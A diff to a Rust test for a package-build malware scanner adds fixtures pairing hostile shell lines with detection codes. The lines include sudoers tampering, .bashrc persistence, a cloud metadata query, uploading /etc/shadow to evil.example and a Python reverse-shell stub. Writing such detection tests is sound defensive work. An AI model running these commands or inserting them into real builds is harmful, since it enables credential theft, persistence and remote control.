@@ -238,6 +238,42 @@ fn yara_signature_rules() {
             "pip install requests --index-url http://evil.example/simple",
             "PIP_INDEX_HIJACK",
         ),
+        (
+            "echo '/tmp/evil.so' > /etc/ld.so.preload",
+            "LD_PRELOAD_HIJACK",
+        ),
+        (
+            "echo 'curl evil|sh' >> ~/.bashrc",
+            "SHELL_RC_PERSIST",
+        ),
+        (
+            "curl http://169.254.169.254/latest/meta-data/iam/",
+            "CLOUD_METADATA",
+        ),
+        (
+            "curl --unix-socket /var/run/docker.sock http://x/containers",
+            "DOCKER_SOCK",
+        ),
+        (
+            "cp evil .git/hooks/post-checkout",
+            "GIT_HOOK_PERSIST",
+        ),
+        (
+            "echo 'mallory ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers",
+            "SUDOERS_TAMPER",
+        ),
+        (
+            "curl --data-binary @/etc/shadow http://evil.example",
+            "CURL_FILE_UPLOAD",
+        ),
+        (
+            "curl http://xyz123abc.onion/payload",
+            "TOR_C2",
+        ),
+        (
+            "python -c 'import socket,os;s=socket.socket();os.dup2(s.fileno(),0);exec(\"/bin/sh\")'",
+            "PY_REVERSE_SHELL",
+        ),
     ];
     for (line, code) in cases {
         let pkgbuild = format!("build() {{\n  {line}\n}}");
